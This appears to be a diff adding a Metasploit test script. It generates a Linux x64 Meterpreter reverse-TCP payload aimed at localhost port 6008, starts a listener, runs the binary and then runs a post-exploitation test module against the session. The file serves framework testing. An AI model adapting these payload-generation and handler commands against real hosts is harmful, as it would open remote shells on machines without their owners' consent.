@@ -1,0 +1,23 @@
+## Load test modules
+loadpath test/modules
+
+## Payload
+use linux/x64/meterpreter/reverse_tcp
+
+## Set global datastore
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20240325-3084-hzsyohtxt
+
+## Generate command
+generate -o /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20240325-3084-lhe0a2 -f elf AutoVerifySessionTimeout=30 lport=6008 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20240325-3084-mkenvgtxt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+
+## Create listener
+to_handler AutoVerifySessionTimeout=30 lport=6008 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20240325-3084-mkenvgtxt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+
+## Execute command
+/tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20240325-3084-lhe0a2
+
+
+## Replication commands
+use post/test/extapi
+run session=8 AddEntropy=true Verbose=true
